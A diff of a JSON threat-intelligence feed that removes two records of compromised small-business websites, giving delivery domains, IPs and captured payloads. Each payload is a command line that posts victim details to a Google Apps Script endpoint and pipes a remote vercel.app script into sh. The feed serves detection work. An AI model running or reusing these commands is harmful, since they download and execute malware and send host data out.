@@ -9168,58 +9168,5 @@
     ],
     "ReportId": "cmw92gdsu2i5y0omlbhso6vbf",
     "ScannedAt": "2026-11-09T09:36:03.887000+00:00"
-  },
-  {
-    "UrlDomain": "southwestsocialservicesinc.com",
-    "DeliveryUrl": [
-      "script-six-tawny.vercel.app",
-      "script.google.com"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.216"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=21a93fe7-8de4-49ec-bc9a-e8158d30427a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsouthwestsocialservicesinc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A00%3A45.004Z&lastShellAt=2026-11-09T09%3A00%3A45.004Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmw919kau2hq20omlin08m3ae",
-    "ScannedAt": "2026-11-09T09:02:46.088000+00:00"
-  },
-  {
-    "UrlDomain": "diazlawncareandmaintenance.com",
-    "DeliveryUrl": [
-      "script.google.com",
-      "script-six-tawny.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.201"
-    ],
-    "Related": [
-      {
-        "Value": "https://beacon-floaix-j38uu.pro/t.js?site=065274da8fe72c6862b6629894c947c1",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=851a2189-cf51-42eb-bb25-0aca6fff4673&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdiazlawncareandmaintenance[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T08%3A59%3A37.231Z&lastShellAt=2026-11-09T08%3A59%3A37.231Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmw9185ff2hpc0oml2t2gkjiq",
-    "ScannedAt": "2026-11-09T09:01:40.149000+00:00"
   }
 ]
